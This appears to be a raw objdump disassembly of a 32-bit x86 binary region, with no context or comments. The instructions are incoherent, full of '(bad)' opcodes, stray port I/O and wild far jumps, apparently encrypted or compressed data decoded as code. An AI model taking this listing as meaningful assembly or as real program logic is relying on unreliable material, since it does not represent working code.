  40e144:	fdivr  QWORD PTR [ecx+0x5c4ad52d]
  40e14a:	rol    bl,1
  40e14c:	sbb    BYTE PTR [edi],0xb2
  40e14f:	jmp    0xef9dd920
  40e154:	shr    DWORD PTR [edi],1
  40e156:	cmp    al,0x25
  40e158:	std    
  40e159:	test   BYTE PTR [ecx],0x14
  40e15c:	sub    al,0xee
  40e15e:	retw   0xcbae
  40e162:	cmp    al,BYTE PTR [eax+0xe]
  40e165:	adc    eax,0xa52fb1a
  40e16a:	nop
  40e16b:	pop    edi
  40e16c:	inc    esp
  40e16d:	xchg   esp,eax
  40e16e:	mov    ds:0x95d32e4a,al
  40e173:	xchg   esi,eax
  40e174:	test   eax,0xe987ff13
  40e179:	(bad)  
  40e17a:	int    0x3e
  40e17c:	sahf   
  40e17d:	xchg   DWORD PTR [edi-0x2f],esp
  40e180:	les    ecx,FWORD PTR [ecx-0x5284d93d]
  40e186:	into   
  40e187:	xchg   DWORD PTR [ebp+0x30],edi
  40e18a:	sbb    al,0xec
  40e18c:	mov    DWORD PTR [esi],esi
  40e18e:	mov    ah,0x72
  40e190:	pop    esi
  40e191:	or     ebp,DWORD PTR [ecx-0x1841e442]
  40e197:	xor    al,0x6d
  40e199:	js     0x40e17e
  40e19b:	int3   
  40e19c:	mov    dl,0x35
  40e19e:	pop    esp
  40e19f:	pop    edx
  40e1a0:	jle    0x40e1c7
  40e1a2:	rcl    BYTE PTR [edi-0xc2f1595],1
  40e1a8:	imul   esp,DWORD PTR [ecx-0x54],0x1d
  40e1ac:	inc    edx
  40e1ad:	push   eax
  40e1ae:	outs   dx,BYTE PTR ds:[esi]
  40e1af:	add    edi,esp
  40e1b1:	test   BYTE PTR [esi],ah
  40e1b3:	mov    ds:0x1134c8f2,eax
  40e1b8:	or     ah,dh
  40e1ba:	fldcw  WORD PTR [edx+0x1a]
  40e1bd:	test   al,0x64
  40e1bf:	in     eax,dx
  40e1c0:	jmp    0x243f44e5
  40e1c5:	jo     0x40e1d1
  40e1c7:	xchg   ebx,eax
  40e1c8:	mov    esp,0x32c1447c
  40e1cd:	(bad)  
  40e1ce:	shl    BYTE PTR [ecx-0x1c8f7631],1
  40e1d4:	daa    
  40e1d5:	pop    esi
  40e1d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1d7:	frstor [ebp-0x15f458cc]
  40e1dd:	fxch   st(3)
  40e1df:	mov    bl,0xf9
  40e1e1:	repnz inc ebx
  40e1e4:	mov    ch,0x20
  40e1e6:	popf   
  40e1e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1e8:	int3   
  40e1e9:	out    dx,al
  40e1ea:	xchg   esp,eax
  40e1eb:	sbb    bl,cl
  40e1ed:	adc    al,BYTE PTR [ecx+0x4303ac33]
  40e1f3:	or     ah,BYTE PTR [ebx]
  40e1f5:	mov    ?,WORD PTR [eax-0x3e]
  40e1f8:	out    dx,eax
  40e1f9:	cmp    DWORD PTR [edx],edi
  40e1fb:	pop    es
  40e1fc:	xchg   edx,eax
  40e1fd:	dec    ebx
  40e1fe:	pop    edi
  40e1ff:	and    DWORD PTR [ebp+0x6c11dbe7],edx
  40e205:	sbb    DWORD PTR [ecx],edi
  40e207:	daa    
  40e208:	(bad)  
  40e209:	popf   
  40e20a:	sbb    BYTE PTR [eax-0x2c3459a3],al
  40e210:	xor    BYTE PTR [eax-0x57a0264a],ch
  40e216:	jl     0x40e238
  40e218:	ins    DWORD PTR es:[edi],dx
  40e219:	add    eax,DWORD PTR [edx]
  40e21b:	add    eax,0xe1cce67f
  40e220:	scas   eax,DWORD PTR es:[edi]
  40e221:	dec    ebp
  40e222:	dec    ecx
  40e223:	push   ecx
  40e224:	add    al,0xc
  40e226:	test   al,0xe6
  40e228:	ins    DWORD PTR es:[edi],dx
  40e229:	dec    eax
  40e22a:	lock push esp
  40e22c:	inc    esi
  40e22d:	and    al,0xc1
  40e22f:	mov    ebp,0x2e891ac1
  40e234:	add    ah,bh
  40e236:	out    0xa4,al
  40e238:	sbb    ebx,DWORD PTR [ecx]
  40e23a:	add    BYTE PTR [ecx-0x710b2173],ch
  40e240:	dec    edx
  40e241:	sbb    BYTE PTR [ecx+ebx*2],ch
  40e244:	int    0xe0
  40e246:	fwait
  40e247:	inc    edx
  40e248:	scas   al,BYTE PTR es:[edi]
  40e249:	dec    eax
  40e24a:	int3   
  40e24b:	leave  
  40e24c:	xor    ah,dl
  40e24e:	call   0x31986246
  40e253:	sub    eax,0x59a0c06a
  40e258:	test   al,dh
  40e25a:	mov    ds:0xc3a9cc00,al
  40e25f:	hlt    
  40e260:	add    DWORD PTR [eax],edx
  40e262:	and    BYTE PTR ds:0x4fc2,dl
  40e267:	push   ecx
  40e268:	adc    eax,0x979478b3
  40e26d:	ret    
  40e26e:	sub    BYTE PTR [edx+ebx*2+0x75],bl
  40e272:	sti    
  40e273:	dec    ebp
  40e274:	call   DWORD PTR [edx+0xc16a29b]
  40e27a:	inc    ebx
  40e27b:	mov    eax,DWORD PTR [edx+0x31]
  40e27e:	lock or bh,dl
  40e281:	mov    dh,0x4a
  40e283:	enter  0x19bd,0xcf
  40e287:	(bad)  
  40e288:	jb     0x40e239
  40e28a:	xlat   BYTE PTR ds:[ebx]
  40e28b:	mov    ebp,0x8d77a089
  40e290:	jnp    0x40e21e
  40e292:	inc    esi
  40e293:	imul   edx,DWORD PTR [eax-0x2d],0xffffffaf
  40e297:	popf   
  40e298:	jecxz  0x40e295
  40e29a:	pop    es
  40e29b:	bound  edx,QWORD PTR [edi*4-0x32864659]
  40e2a2:	mov    fs,WORD PTR [eax+0x2425a050]
  40e2a8:	or     al,bh
  40e2aa:	jmp    0x8fb03432
  40e2af:	inc    ebx
  40e2b0:	push   ds
  40e2b1:	es inc edi
  40e2b3:	jae    0x40e2d6
  40e2b5:	sbb    eax,DWORD PTR ds:0xd9c3441a
  40e2bb:	je     0x40e26f
  40e2bd:	sub    eax,0xe5c6cbb4
  40e2c2:	fsubrp st(7),st
  40e2c4:	adc    DWORD PTR [ebx],0x6e74b3c
  40e2ca:	jp     0x40e2d9
  40e2cc:	push   edi
  40e2cd:	rcr    edx,cl
  40e2cf:	mov    bl,0x84
  40e2d1:	stos   BYTE PTR es:[edi],al
  40e2d2:	inc    edi
  40e2d3:	(bad)  [ebx+0x37]
  40e2d6:	aaa    
  40e2d7:	mov    ds:0xa7e45535,al
  40e2dc:	cmp    ebx,DWORD PTR [ebx-0x47a4faef]
  40e2e2:	dec    edi
  40e2e3:	stos   DWORD PTR es:[edi],eax
  40e2e4:	sbb    BYTE PTR [eax+0x32343eea],dl
  40e2ea:	xchg   edx,eax
  40e2eb:	outs   dx,BYTE PTR ds:[esi]
  40e2ec:	jbe    0x40e2b4
  40e2ee:	rcl    cl,1
  40e2f0:	mov    bl,cl
  40e2f2:	popf   
  40e2f3:	xchg   ebx,eax
  40e2f4:	cwde   
  40e2f5:	aam    0xb8
  40e2f7:	jecxz  0x40e288
  40e2f9:	jbe    0x40e2aa
  40e2fb:	lock cmp ah,BYTE PTR [esi-0x16a6dc30]
  40e302:	out    dx,eax
  40e303:	rcr    DWORD PTR [ebp+ecx*1-0x7f3ccbf5],0xd2
  40e30b:	das    
  40e30c:	push   cs
  40e30d:	fist   DWORD PTR [esi-0x32d1f3c3]
  40e313:	pop    ds
  40e314:	data16 arpl ax,sp
  40e317:	popa   
  40e318:	and    BYTE PTR [ecx+0x7793c571],dh
  40e31e:	xchg   edi,eax
  40e31f:	lahf   
  40e320:	retf   
  40e321:	aad    0x13
  40e323:	jecxz  0x40e379
  40e325:	jnp    0x40e36e
  40e327:	push   ecx
  40e328:	cmc    
  40e329:	mov    ecx,ebx
  40e32b:	div    esi
  40e32d:	sbb    DWORD PTR [eax],ebx
  40e32f:	outs   dx,DWORD PTR ds:[esi]
  40e330:	pop    eax
  40e331:	pusha  
  40e332:	mov    bh,BYTE PTR [ebx+eiz*2-0x4960cf9b]
  40e339:	shl    DWORD PTR [edi-0x60],cl
  40e33c:	pop    ss
  40e33d:	jne    0x40e2c0
  40e33f:	sub    BYTE PTR [esi+esi*1-0x3f3a4251],dh
  40e346:	xchg   ebx,eax
  40e347:	mov    esp,0x2c9cde16
  40e34c:	lock mov eax,ds:0x3bf1d1db
  40e352:	ss nop
  40e354:	cld    
  40e355:	out    0x1e,eax
  40e357:	cmc    
  40e358:	mov    cl,0x5c
  40e35a:	or     eax,0x9e436da9
  40e35f:	push   ecx
  40e360:	outs   dx,DWORD PTR ds:[esi]
  40e361:	sbb    al,0x1c
  40e363:	mov    ebp,0xd9760d62
  40e368:	rcl    ecx,cl
  40e36a:	test   ah,ah
  40e36c:	mov    ch,BYTE PTR [edi-0x43]
  40e36f:	add    dl,ah
  40e371:	fisttp DWORD PTR [ecx+0x4be94655]
  40e377:	mov    cl,0x2e
  40e379:	jle    0x40e3f8
  40e37b:	cmp    ebx,DWORD PTR [ecx+0x7e151bca]
  40e381:	les    eax,FWORD PTR [ebx-0x1e720c67]
  40e387:	and    DWORD PTR [esi+0x57fd27dd],eax
  40e38d:	jmp    0xd842:0xdb31dcca
  40e394:	adc    al,0x0
  40e396:	inc    ebx
  40e397:	test   DWORD PTR [ebx+0x37],0x48169cc4
  40e39e:	cld    
  40e39f:	outs   dx,DWORD PTR ds:[esi]
  40e3a0:	in     eax,dx
  40e3a1:	inc    eax
  40e3a2:	int    0x5
  40e3a4:	sub    ch,BYTE PTR [ebp-0x794caf70]
  40e3aa:	inc    ebx
  40e3ac:	or     ecx,DWORD PTR [eax+0x7c]
  40e3af:	clc    
  40e3b0:	outs   dx,BYTE PTR ds:[esi]
  40e3b1:	fidivr DWORD PTR [ebp+0x17bd485c]
  40e3b7:	sub    ebp,DWORD PTR [ebp-0x21d7562a]
  40e3bd:	cdq    
  40e3be:	xchg   DWORD PTR [ecx-0x41],eax
  40e3c1:	sub    esi,ecx
  40e3c3:	push   ecx
  40e3c4:	sti    
  40e3c5:	add    DWORD PTR [ebx+0x68858dd8],0xe9ffffff
  40e3cf:	push   es
  40e3d0:	add    eax,0xc9ce0000
  40e3d5:	ds cmp eax,0xd9cdc9d9
  40e3db:	xor    al,0xff
  40e3dd:	xchg   ebp,eax
  40e3de:	xor    ecx,DWORD PTR [eax+0x6f]
  40e3e1:	or     eax,0x78461a9b
  40e3e6:	js     0x40e452
  40e3e8:	jl     0x40e462
  40e3ea:	js     0x40e462
  40e3ec:	(bad)  
  40e3ed:	xor    al,0xab
  40e3ef:	jecxz  0x40e387
  40e3f1:	ret    
  40e3f2:	ins    BYTE PTR es:[edi],dx
  40e3f3:	gs adc dl,bl
  40e3f6:	scas   eax,DWORD PTR es:[edi]
  40e3f7:	ss mov dl,0x25
  40e3fa:	hlt    
  40e3fb:	push   esp
  40e3fc:	jp     0x40e43d
  40e3fe:	mov    ah,0xf9
  40e400:	jmp    0x40e3f6
  40e402:	xor    al,0x83
  40e404:	outs   dx,BYTE PTR ds:[esi]
  40e405:	jae    0x40e3a6
  40e407:	ins    DWORD PTR es:[edi],dx
  40e408:	jl     0x40e42c
  40e40a:	jb     0x40e466
  40e40c:	(bad)
  40e410:	or     al,BYTE PTR [ecx+0x2f]
  40e413:	icebp  
  40e414:	cmc    
  40e415:	push   ecx
  40e416:	test   DWORD PTR [edi],0xe762a85c
  40e41c:	pushf  
  40e41d:	retf   
  40e41e:	jne    0x40e459
  40e420:	add    ch,BYTE PTR [edx-0x45d5d23a]
  40e426:	push   cs
  40e427:	mov    ds,ebp
  40e429:	pop    ecx
  40e42a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e42b:	leave  
  40e42c:	pop    esi
  40e42d:	je     0x40e3f3
  40e42f:	add    dh,ah
  40e431:	pushf  
  40e432:	or     dh,cl
  40e434:	fucomp st(4)
  40e436:	mov    ds:0xc1bfa12e,eax
  40e43b:	scas   eax,DWORD PTR es:[edi]
  40e43c:	pop    edx
  40e43d:	sub    al,0xb9
  40e43f:	or     al,0xbb
  40e441:	sbb    BYTE PTR [ecx+0x7bef2eac],al
  40e447:	das    
  40e448:	(bad)  [ecx+0x4]
  40e44b:	xlat   BYTE PTR ds:[ebx]
  40e44c:	sub    edi,DWORD PTR ds:[ecx+ebx*8-0x7e]
  40e451:	xlat   BYTE PTR ds:[ebx]
  40e452:	push   edi
  40e453:	jecxz  0x40e4b6
  40e455:	cmp    BYTE PTR [edi],dl
  40e457:	dec    ecx
  40e458:	jg     0x40e483
  40e45a:	push   0x115c9afd
  40e45f:	inc    esp
  40e460:	stos   BYTE PTR es:[edi],al
  40e461:	popf   
  40e462:	jp     0x40e419
  40e464:	add    al,0x8f
  40e466:	lock inc edx
  40e468:	shl    DWORD PTR [eax],cl
  40e46a:	(bad)  
  40e46c:	out    0xe,eax
  40e46e:	dec    ebp
  40e46f:	xchg   esi,eax
  40e470:	mov    ds:0x9b36a577,al
  40e475:	pop    ebx
  40e476:	xor    eax,0xa18e434c
  40e47b:	dec    edi
  40e47c:	dec    ebp
  40e47d:	add    al,0x57
  40e47f:	mov    ebp,0xccadeb48
  40e484:	inc    edx
  40e485:	rcl    BYTE PTR [ecx-0x59],0x62
  40e489:	daa    
  40e48a:	or     DWORD PTR [ebp+edx*2+0x6683658e],ebp
  40e491:	jbe    0x40e479
  40e493:	iret   
  40e494:	fldenv [ecx]
  40e496:	add    esi,esi
  40e498:	inc    ebx
  40e499:	fnstenv [edx-0x23944e6d]
  40e49f:	inc    ecx
  40e4a0:	call   0x726fdebb
  40e4a5:	addr16 in al,dx
  40e4a7:	jge    0x40e442
  40e4a9:	scas   al,BYTE PTR es:[edi]
  40e4aa:	sbb    al,bl
  40e4ac:	push   cs
  40e4ad:	add    eax,0x94bd29a2
  40e4b2:	(bad)  
  40e4b3:	repz scas al,BYTE PTR es:[edi]
  40e4b5:	mov    ebp,0x21d6532d
  40e4ba:	cmp    al,bl
  40e4bc:	jmp    0x60a65b99
  40e4c1:	xor    BYTE PTR [eax-0x26],al
  40e4c4:	pop    esp
  40e4c5:	inc    esi
  40e4c6:	sahf   
  40e4c7:	jae    0x40e46e
  40e4c9:	xchg   ebp,eax
  40e4ca:	push   esi
  40e4cb:	sub    eax,DWORD PTR [edx-0x45b57426]
  40e4d1:	push   ds
  40e4d2:	std    
  40e4d3:	(bad)  
  40e4d6:	cmp    BYTE PTR ds:0x9a35c8e2,dh
  40e4dc:	cmp    BYTE PTR [eax-0x372b4e39],0x31
  40e4e3:	xchg   ebx,eax
  40e4e4:	in     al,dx
  40e4e5:	repz cwde 
  40e4e7:	das    
  40e4e8:	out    0x63,eax
  40e4ea:	and    DWORD PTR [edx-0x361b7c60],ebx
  40e4f0:	or     BYTE PTR [ecx+0x467ef6ef],dl
  40e4f6:	fcmove st,st(1)
  40e4f8:	push   eax
  40e4f9:	jg     0x40e4b1
  40e4fb:	mov    ch,0x7d
  40e4fd:	pop    ss
  40e4fe:	pop    ebx
  40e4ff:	mov    al,ds:0x2bff9dd6
  40e504:	pop    es
  40e505:	addr16 xor eax,ebp
  40e508:	push   ecx
  40e509:	cmp    eax,0x9e11abd1
  40e50e:	(bad)  
  40e50f:	mov    esi,0x52a55f83
  40e514:	in     al,0x82
  40e516:	xchg   ecx,ecx
  40e518:	push   ecx
  40e519:	retf   
  40e51a:	xor    DWORD PTR [edi-0x13],edi
  40e51d:	mov    gs,WORD PTR [eax-0x74002552]
  40e523:	inc    eax
  40e524:	cmp    ebp,DWORD PTR [eax+0x35]
  40e527:	adc    ebp,DWORD PTR [esi]
  40e529:	jge    0x40e52a
  40e52b:	(bad)  
  40e52c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e52d:	dec    ebp
  40e52e:	mov    ch,0x66
  40e530:	in     al,0x4f
  40e532:	jo     0x40e59c
  40e534:	enter  0x1b56,0xfc
  40e538:	outs   dx,DWORD PTR ds:[esi]
  40e539:	pop    eax
  40e53a:	ins    BYTE PTR es:[edi],dx
  40e53b:	or     ch,BYTE PTR [esi-0x519cb41e]
  40e541:	pop    ss
  40e542:	sti    
  40e543:	add    ah,BYTE PTR [ecx+0x66]
  40e546:	dec    ebp
  40e547:	mov    ds:0xfe834ef6,al
  40e54c:	sbb    al,0x4e
  40e54e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e54f:	repz mov ds:0x811be0c6,eax
  40e555:	cdq    
  40e556:	fcomip st,st(2)
  40e558:	cmc    
  40e559:	lahf   
  40e55a:	iret   
  40e55b:	cmc    
  40e55c:	popf   
  40e55d:	pop    esi
  40e55e:	lock xor DWORD PTR [ebx-0x5a],edx
  40e562:	mov    ch,0x6b
  40e564:	sbb    edi,DWORD PTR [esp+edx*2-0x176407a8]
  40e56b:	xlat   BYTE PTR ds:[ebx]
  40e56c:	dec    eax
  40e56d:	mov    bl,0xa0
  40e56f:	and    eax,0x4215faf9
  40e574:	mov    ah,0x90
  40e576:	aas    
  40e577:	mov    BYTE PTR [eax],bh
  40e579:	adc    BYTE PTR [ecx-0x640fd04a],al
  40e57f:	(bad)  
  40e581:	or     dl,BYTE PTR fs:[edi+0x12]
  40e585:	push   cs
  40e586:	mov    ebp,0x3e271463
  40e58b:	cmp    al,0xc3
  40e58d:	outs   dx,BYTE PTR ds:[esi]
  40e58e:	push   0x6c
  40e590:	push   ebx
  40e591:	pop    esi
  40e592:	sbb    DWORD PTR ds:[esp+ebx*8],0x54
  40e597:	ja     0x40e5e1
  40e599:	scas   al,BYTE PTR es:[edi]
  40e59a:	in     eax,0xa6
  40e59c:	lods   eax,DWORD PTR ds:[esi]
  40e59d:	dec    ebx
  40e59e:	inc    esp
  40e59f:	sar    DWORD PTR ds:0x3e1a94df,cl
  40e5a5:	and    DWORD PTR [edi],edi
  40e5a7:	fcom   DWORD PTR [edx+0x45]
  40e5aa:	in     al,dx
  40e5ab:	mov    esp,0xddac7af7
  40e5b0:	mov    dh,0xee
  40e5b2:	in     eax,0x3c
  40e5b4:	fisub  WORD PTR [ecx+0x3c56892d]
  40e5ba:	and    BYTE PTR [esi],dl
  40e5bc:	or     ebp,DWORD PTR [ecx-0x52]
  40e5bf:	rol    DWORD PTR [ecx+0x2ac4ce34],cl
  40e5c5:	jb     0x40e5ce
  40e5c7:	call   0x67ab46bb
  40e5cc:	imul   ecx,esi,0x1b8e65a
  40e5d2:	push   ds
  40e5d3:	jmp    0x7a9f:0xf1d1a4f5
  40e5da:	adc    eax,0x854963e9
  40e5df:	fldenv [ebp+ebx*1+0x58]
  40e5e3:	inc    ecx
  40e5e4:	mov    esi,0xe0cd5340
  40e5e9:	repnz cld 
  40e5eb:	in     eax,dx
  40e5ec:	sub    edi,edx
  40e5ee:	push   0x68
  40e5f0:	lods   eax,DWORD PTR ds:[esi]
  40e5f1:	test   BYTE PTR [edi-0x11],cl
  40e5f4:	test   cl,dh
  40e5f6:	xor    cl,BYTE PTR [eax]
  40e5f8:	cld    
  40e5f9:	add    ebp,0x2b2706ac
  40e5ff:	sbb    eax,0x7d4bb3f8
  40e604:	jp     0x40e60a
  40e606:	mov    al,ds:0xc58e5ff2
  40e60b:	cmp    al,0x97
  40e60d:	add    edx,DWORD PTR [esi-0x30]
  40e610:	mov    bl,BYTE PTR [ebx-0x766c1f4a]
  40e616:	scas   al,BYTE PTR es:[edi]
  40e617:	repnz rol BYTE PTR [esp+edi*8+0x1f908a59],1
  40e61f:	scas   al,BYTE PTR es:[edi]
  40e620:	(bad)  
  40e621:	ds pop ebx
  40e623:	cmp    al,0x82
  40e625:	mov    cl,0xe7
  40e627:	cmp    ah,al
  40e629:	mov    ds:0xed3f100a,al
  40e62e:	inc    edx
  40e62f:	or     al,0x8d
  40e631:	stos   BYTE PTR es:[edi],al
  40e632:	mov    BYTE PTR [eax+0x51311157],cl
  40e638:	stc    
  40e639:	stc    
  40e63a:	inc    esp
  40e63b:	cmp    edi,DWORD PTR [esi+eiz*2]
  40e63e:	xchg   edi,eax
  40e63f:	iret   
  40e640:	test   edi,ecx
  40e642:	lds    esp,FWORD PTR [edx+0x2ca12a5f]
  40e648:	dec    eax
  40e649:	and    al,0x8f
  40e64b:	(bad)  
  40e64c:	sub    esp,edi
  40e64e:	idiv   BYTE PTR [esi-0x6555a573]
  40e654:	xor    cl,BYTE PTR [edx]
  40e656:	adc    BYTE PTR [edx],bl
  40e658:	dec    edx
  40e659:	jmp    0x40e6ad
  40e65b:	fwait
  40e65c:	jae    0x40e61b
  40e65e:	int3   
  40e65f:	lods   eax,DWORD PTR ds:[esi]
  40e660:	adc    edi,DWORD PTR [esi+0x7b]
  40e663:	retf   
  40e664:	mov    esp,0x4aceb68
  40e669:	dec    DWORD PTR [ecx+0x7126d63a]
  40e66f:	cmp    al,0x51
  40e671:	ja     0x40e682
  40e673:	xlat   BYTE PTR ds:[ebx]
  40e674:	aad    0xe6
  40e676:	jmp    0x40e640
  40e678:	pop    eax
  40e679:	icebp  
  40e67a:	mov    ?,WORD PTR [ebx+0x67]
  40e67d:	jbe    0x40e66b
  40e67f:	xor    ebp,DWORD PTR [edi-0x379dceb0]
  40e685:	retf   0x5581
  40e688:	sahf   
  40e689:	push   ds
  40e68a:	adc    edx,DWORD PTR [eax-0x358298ce]
  40e690:	loop   0x40e61f
  40e692:	xchg   BYTE PTR [ecx-0x7e],dl
  40e695:	adc    esi,edi
  40e697:	call   DWORD PTR [esi-0x3b]
  40e69a:	in     al,dx
  40e69b:	push   es
  40e69c:	ja     0x40e6db
  40e69e:	retf   
  40e69f:	daa    
  40e6a0:	in     al,dx
  40e6a1:	mov    dh,0x70
  40e6a3:	jb     0x40e6b6
  40e6a5:	aas    
  40e6a6:	stc    
  40e6a7:	add    ah,BYTE PTR [ecx]
  40e6a9:	sub    al,0x55
  40e6ab:	and    BYTE PTR [eax-0x6b],dl
  40e6ae:	push   ds
  40e6af:	loopne 0x40e719
  40e6b1:	ficom  DWORD PTR [edx-0x5b6c446e]
  40e6b7:	cwde   
  40e6b8:	pop    ds
  40e6b9:	inc    sp
  40e6bb:	sahf   
  40e6bc:	jb     0x40e6c4
  40e6be:	mov    al,ds:0x60dda86d
  40e6c3:	and    DWORD PTR [ebx],eax
  40e6c5:	inc    edi
  40e6c6:	mov    al,ds:0xd26247f0
  40e6cb:	ins    BYTE PTR es:[edi],dx
  40e6cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6cd:	or     BYTE PTR [edx+0x3be5fcc1],dl
  40e6d3:	inc    ebx
  40e6d4:	in     al,dx
  40e6d5:	pop    ss
  40e6d6:	pop    esp
  40e6d7:	adc    al,0xcc
  40e6d9:	mov    eax,0xdff74467
  40e6de:	cmc    
  40e6df:	daa    
  40e6e0:	cmp    ecx,ebx
  40e6e2:	and    BYTE PTR [eax+eax*4-0x3ca88bb3],ch
  40e6e9:	and    eax,0xc3c8c8a
  40e6ee:	shl    bh,0xe0
  40e6f1:	ror    ebp,0xb4
  40e6f4:	inc    edx
  40e6f5:	mov    cs,WORD PTR [ebp+0x4bc05a6f]
  40e6fb:	sbb    edi,ebp
  40e6fd:	imul   eax,DWORD PTR [ebx+0x4d],0xff13d53c
  40e704:	pop    esp
  40e705:	add    DWORD PTR [esi-0x5a7b192a],ebx
  40e70b:	push   es
  40e70c:	xchg   edx,eax
  40e70d:	loope  0x40e78d
  40e70f:	mov    dl,0xe6
  40e711:	jp     0x40e723
  40e713:	neg    BYTE PTR [ecx+0x10]
  40e716:	mov    al,0xa
  40e718:	add    dl,BYTE PTR [ebx]
  40e71a:	ret    
  40e71b:	push   ebx
  40e71c:	mov    ah,0xbe
  40e71e:	cmp    edx,DWORD PTR [edx+0x47]
  40e721:	sahf   
  40e722:	push   edi
  40e723:	sbb    DWORD PTR [ecx+ebx*2],eax
  40e726:	ja     0x40e755
  40e728:	sub    edx,DWORD PTR [esi+ecx*8+0x15]
  40e72c:	xchg   BYTE PTR [eax],bl
  40e72e:	daa    
  40e72f:	mov    ecx,ebp
  40e731:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e732:	mov    DWORD PTR [ebx],edx
  40e734:	out    dx,al
  40e735:	bound  eax,QWORD PTR [eax+0x31]
  40e738:	push   eax
  40e739:	ins    BYTE PTR es:[edi],dx
  40e73a:	xchg   edx,eax
  40e73b:	call   0x52b8:0x2f3ce4ac
  40e742:	mov    al,ds:0xa36fbe44
  40e747:	push   eax
  40e748:	test   BYTE PTR [ebx-0x4bffc23b],0x2a
  40e74f:	xor    BYTE PTR ds:0x46cd26eb,0x8b
  40e756:	xchg   DWORD PTR [edi],esi
  40e758:	xchg   ebp,eax
  40e759:	ds shr dh,cl
  40e75c:	loope  0x40e781
  40e75e:	ret    0xe7ec
  40e761:	xchg   edx,eax
  40e762:	sahf   
  40e763:	lods   al,BYTE PTR ds:[esi]
  40e764:	xchg   BYTE PTR [ebx],bh
  40e766:	lods   eax,DWORD PTR ds:[esi]
  40e767:	xlat   BYTE PTR ds:[ebx]
  40e768:	les    edx,FWORD PTR [ebp+0x6efcfcfb]
  40e76e:	int3   
  40e76f:	xor    bl,BYTE PTR [edx-0x2c]
  40e772:	mov    ah,0x2a
  40e774:	icebp  
  40e775:	jge    0x40e74b
  40e777:	cld    
  40e778:	fidivr WORD PTR [ecx]
  40e77a:	and    bl,ah
  40e77c:	push   eax
  40e77d:	ret    0xf9bb
  40e780:	jge    0x40e7c8
  40e782:	mov    esi,0xd9713724
  40e787:	fisubr DWORD PTR [ecx]
  40e789:	popa   
  40e78a:	js     0x40e793
  40e78c:	mov    ds:0x2ffd4bf0,al
  40e791:	aad    0x4d
  40e793:	mov    dh,0xe
  40e795:	cmp    al,0xa8
  40e797:	jmp    0x40e78c
  40e799:	jl     0x40e7b6
  40e79b:	mov    ah,0x5
  40e79d:	sbb    ebx,edi
  40e79f:	out    dx,eax
  40e7a0:	ss dec esi
  40e7a2:	add    esi,DWORD PTR [edi-0x41]
  40e7a5:	sahf   
  40e7a6:	jl     0x40e817
  40e7a8:	push   ebx
  40e7a9:	adc    edx,ecx
  40e7ab:	ins    BYTE PTR es:[edi],dx
  40e7ac:	inc    ebx
  40e7ad:	fidiv  WORD PTR [ebp-0x56]
  40e7b0:	fistp  DWORD PTR [ecx-0x32]
  40e7b3:	pop    esi
  40e7b4:	aaa    
  40e7b5:	loop   0x40e791
  40e7b7:	jp     0x40e776
  40e7b9:	test   BYTE PTR [ebx-0x29010c64],bh
  40e7bf:	fiadd  WORD PTR ds:0xae1e6b80
  40e7c5:	jne    0x40e7a5
  40e7c7:	stos   DWORD PTR es:[edi],eax
  40e7c8:	out    0x7,al
  40e7ca:	xor    bl,BYTE PTR [edx+0x1e0dc62e]
  40e7d0:	jp     0x40e84a
  40e7d2:	out    0x41,eax
  40e7d4:	xor    al,0xb0
  40e7d6:	add    edx,DWORD PTR [ebx]
  40e7d8:	fcom   DWORD PTR [esp+ebp*4-0x6]
  40e7dc:	xor    ch,cl
  40e7de:	scas   al,BYTE PTR es:[edi]
  40e7df:	dec    edi
  40e7e0:	dec    ebp
  40e7e1:	adc    al,0xf6
  40e7e3:	fsub   DWORD PTR [eax]
  40e7e5:	and    al,ah
  40e7e7:	cmp    al,0x9b
  40e7e9:	or     dh,bl
  40e7eb:	push   esp
  40e7ec:	lea    eax,[ebx-0x4914f78a]
  40e7f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7f3:	in     eax,0xa1
  40e7f5:	stc    
  40e7f6:	or     eax,0x6200c78f
  40e7fb:	push   0x1485f314
  40e800:	dec    BYTE PTR [ecx]
  40e802:	stos   BYTE PTR es:[edi],al
  40e803:	inc    esi
  40e804:	sub    al,0x9b
  40e806:	cmp    dh,dh
  40e808:	push   edi
  40e809:	push   0xffffffd8
  40e80b:	sub    eax,DWORD PTR [ebx-0x579d24f2]
  40e811:	ins    DWORD PTR es:[edi],dx
  40e812:	(bad)  
  40e814:	ret    0x5bb
  40e817:	icebp  
  40e818:	xchg   ebp,eax
  40e819:	jle    0x40e7e8
  40e81b:	or     BYTE PTR [edx-0x63],bh
  40e81e:	sbb    DWORD PTR [edx+0x2bfb5ba4],0x77
  40e825:	test   eax,0x2c489a78
  40e82a:	mov    ds:0xee146d1,al
  40e82f:	sbb    al,0x5f
  40e831:	(bad)  
  40e832:	or     edi,edx
  40e834:	in     eax,dx
  40e835:	and    eax,0xed27cdcd
  40e83a:	adc    DWORD PTR [ebx-0x51],0xede46a1f
  40e841:	jl     0x40e886
  40e843:	pop    es
  40e844:	adc    al,dl
  40e846:	cld    
  40e847:	mov    ds:0x91cea89,al
  40e84c:	sbb    al,0x6d
  40e84e:	scas   al,BYTE PTR es:[edi]
  40e84f:	in     eax,0x98
  40e851:	push   ebx
  40e852:	aad    0x9e
  40e854:	fisttp QWORD PTR [eax+0x4b]
  40e857:	loop   0x40e7e6
  40e859:	add    DWORD PTR [esp+ebx*1-0x7c],0xfffffff1
  40e85e:	add    DWORD PTR [edi],eax
  40e860:	push   esp
  40e861:	inc    ecx
  40e862:	jbe    0x40e8e1
  40e864:	lahf   
  40e865:	scas   al,BYTE PTR es:[edi]
  40e866:	outs   dx,DWORD PTR ds:[esi]
  40e867:	jmp    0x9cba:0xcfd951f0
  40e86e:	inc    edi
  40e86f:	pusha  
  40e870:	mov    WORD PTR [esi],ds
  40e872:	mov    ah,BYTE PTR [ecx+ebp*8-0x274c0e72]
  40e879:	pop    edi
  40e87a:	mov    edi,0x7aa2b56f
  40e87f:	xchg   ebp,eax
  40e880:	icebp  
  40e881:	pop    edi
  40e882:	inc    eax
  40e883:	or     al,0x43
  40e885:	lods   al,BYTE PTR ds:[esi]
  40e886:	aaa    
  40e887:	test   BYTE PTR [esi-0x80],dh
